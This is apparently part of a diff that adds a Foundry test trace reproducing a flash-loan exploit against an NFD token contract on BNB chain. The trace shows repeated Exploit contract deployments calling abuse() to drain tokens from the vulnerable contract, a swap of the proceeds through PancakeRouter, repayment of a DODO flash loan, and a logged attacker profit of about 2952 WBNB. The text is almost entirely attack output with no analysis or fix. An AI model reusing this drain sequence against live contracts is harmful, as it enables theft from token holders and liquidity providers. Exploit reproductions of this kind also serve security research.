+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 212545278059832320036896275 [2.125e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 212545278059832320036896275 [2.125e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 212545278059832320036896200 [2.125e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 212545278059832320036896275 [2.125e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98], 212545278059832320036896275 [2.125e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98], value: 212545278059832320036896200 [2.125e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 212545278059832320036896275 [2.125e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98], 17683767134578049027069770 [1.768e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98], value: 17683767134578049027069700 [1.768e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 230229045194410369063966044 [2.302e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 230229045194410369063966044 [2.302e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x22b24e3bBa3087f537d2E35f8E2F1E9a257eAa98], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 230229045194410369063966000 [2.302e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xa648d767E212563209D177FDe18476765D00a9eD
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 230229045194410369063966044 [2.302e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD], 230229045194410369063966044 [2.302e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD], value: 230229045194410369063966000 [2.302e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 230229045194410369063966043 [2.302e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD], 19155056560174942706121974 [1.915e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD], value: 19155056560174942706121900 [1.915e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 249384101754585311770088017 [2.493e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 249384101754585311770088017 [2.493e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xa648d767E212563209D177FDe18476765D00a9eD], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 249384101754585311770088000 [2.493e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 249384101754585311770088017 [2.493e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7], 249384101754585311770088017 [2.493e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7], value: 249384101754585311770088000 [2.493e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 249384101754585311770088016 [2.493e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7], 20748757265981497939271322 [2.074e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7], value: 20748757265981497939271300 [2.074e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 270132859020566809709359338 [2.701e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 270132859020566809709359338 [2.701e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 270132859020566809709359300 [2.701e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x284ac791c28c0576e31439C17FF143147fb3c6dc
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 270132859020566809709359338 [2.701e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc], 270132859020566809709359338 [2.701e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc], value: 270132859020566809709359300 [2.701e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 270132859020566809709359337 [2.701e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc], 22475053870511158567818696 [2.247e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc], value: 22475053870511158567818600 [2.247e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 292607912891077968277178033 [2.926e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 292607912891077968277178033 [2.926e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x284ac791c28c0576e31439C17FF143147fb3c6dc], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 292607912891077968277178000 [2.926e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 292607912891077968277178033 [2.926e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE], 292607912891077968277178033 [2.926e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE], value: 292607912891077968277178000 [2.926e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 292607912891077968277178032 [2.926e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE], 24344978352537686960661212 [2.434e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE], value: 24344978352537686960661200 [2.434e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 316952891243615655237839244 [3.169e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 316952891243615655237839244 [3.169e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xEB622937951742B95B9B6A5db4A00Ae21BD36AaE], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 316952891243615655237839200 [3.169e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x09b7021FAa14E506B82976a1243ce6b4B0A457c2
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 316952891243615655237839244 [3.169e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2], 316952891243615655237839244 [3.169e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2], value: 316952891243615655237839200 [3.169e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 316952891243615655237839243 [3.169e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2], 26370480551468822515788225 [2.637e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2], value: 26370480551468822515788200 [2.637e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 343323371795084477753627468 [3.433e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 343323371795084477753627468 [3.433e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x09b7021FAa14E506B82976a1243ce6b4B0A457c2], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 343323371795084477753627400 [3.433e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 343323371795084477753627468 [3.433e26]
+    │   │   │   ├─ emit log_named_decimal_uint(key: "[*] NFD balance after attack", val: 343323371795084477753627468 [3.433e26], decimals: 18)
+    │   │   │   ├─ [0] console::log("Swap the profit...") [staticcall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 343323371795084477753627468 [3.433e26]
+    │   │   │   ├─ [25260] NFD::approve(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [141656] PancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(343323371795084477753627468 [3.433e26], 0, [0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9, 0x55d398326f99059fF775485246999027B3197955, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662602962 [1.662e9])
+    │   │   │   │   ├─ [65213] NFD::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x26C0623847637095655B2868C3182B2285bDAeAf, 343323371795084477753627468 [3.433e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 13732934871803379110145096 [1.373e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x3461Bd693eD990642D7252A0Ba57b1f88171C713, value: 13732934871803379110145096 [1.373e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x76010c0c87B02e10A87a3A0410AbCA27489d846d, value: 3433233717950844777536274 [3.433e24])
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(0x26C0623847637095655B2868C3182B2285bDAeAf) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1395988815847563510429694 [1.395e24]
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 68664674359016895550725480 [6.866e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x26C0623847637095655B2868C3182B2285bDAeAf, value: 243759593974509979205075454 [2.437e26])
+    │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640220716085788923435376012467 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [893] 0x26C0623847637095655B2868C3182B2285bDAeAf::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 131638156568548302426278480 [1.316e26], 1395988815847563510429694 [1.395e24], 1662602962 [1.662e9]
+    │   │   │   │   ├─ [2855] NFD::balanceOf(0x26C0623847637095655B2868C3182B2285bDAeAf) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 375397750543058281631353982 [3.753e26]
+    │   │   │   │   ├─ [20685] 0x26C0623847637095655B2868C3182B2285bDAeAf::swap(0, 905671031037792933831664 [9.056e23], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 0x)
+    │   │   │   │   │   ├─ [3271] USDT::transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 905671031037792933831664 [9.056e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x26C0623847637095655B2868C3182B2285bDAeAf, to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 905671031037792933831664 [9.056e23])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(0x26C0623847637095655B2868C3182B2285bDAeAf) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 375397750543058281631353982 [3.753e26]
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(0x26C0623847637095655B2868C3182B2285bDAeAf) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 490317784809770576598030 [4.903e23]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 375397750543058281631353982 [3.753e26], reserve1: 490317784809770576598030 [4.903e23])
+    │   │   │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 243759593974509979205075502 [2.437e26], amount1In: 0, amount0Out: 0, amount1Out: 905671031037792933831664 [9.056e23], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE)
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 79747134749549874076317482 [7.974e25], 285941344537148023026067 [2.859e23], 1662602962 [1.662e9]
+    │   │   │   │   ├─ [531] USDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 80652805780587667010149146 [8.065e25]
+    │   │   │   │   ├─ [38255] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(0, 3202971303206254291601 [3.202e21], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [23162] WBNB::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3202971303206254291601 [3.202e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3202971303206254291601 [3.202e21])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 80652805780587667010149146 [8.065e25]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 282738373233941768734466 [2.827e23]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 80652805780587667010149146 [8.065e25], reserve1: 282738373233941768734466 [2.827e23])
+    │   │   │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 905671031037792933831664 [9.056e23], amount1In: 0, amount0Out: 0, amount1Out: 3202971303206254291601 [3.202e21], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [534] WBNB::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3202971303206254291601 [3.202e21]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [0] console::log("Repay the flashloan...") [staticcall]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [3262] WBNB::transfer(DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7], 250000000000000000000 [2.5e20])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7], value: 250000000000000000000 [2.5e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2952971303206254291601 [2.952e21]
+    │   │   │   ├─ emit log_named_decimal_uint(key: "Attacker's Net Profit", val: 2952971303206254291601 [2.952e21], decimals: 18)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [2487] 0x67ee3Cb086F8a16f34beE3ca72FAD36F7Db929e2::balanceOf(DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]) [staticcall]
+    │   │   │   └─ ← [Return] 655460837613469442277231 [6.554e23]
+    │   │   ├─ [534] WBNB::balanceOf(DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]) [staticcall]
+    │   │   │   └─ ← [Return] 284730287257090013667 [2.847e20]
+    │   │   ├─ [487] 0x67ee3Cb086F8a16f34beE3ca72FAD36F7Db929e2::balanceOf(DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]) [staticcall]
+    │   │   │   └─ ← [Return] 655460837613469442277231 [6.554e23]
+    │   │   ├─ [534] WBNB::balanceOf(DODO: [0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7]) [staticcall]
+    │   │   │   └─ ← [Return] 284730287257090013667 [2.847e20]
+    │   │   ├─ emit DODOFlashLoan(: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 250000000000000000000 [2.5e20])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.85s (29.22s CPU time)
+
+Ran 2 test suites in 30.10s (30.10s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
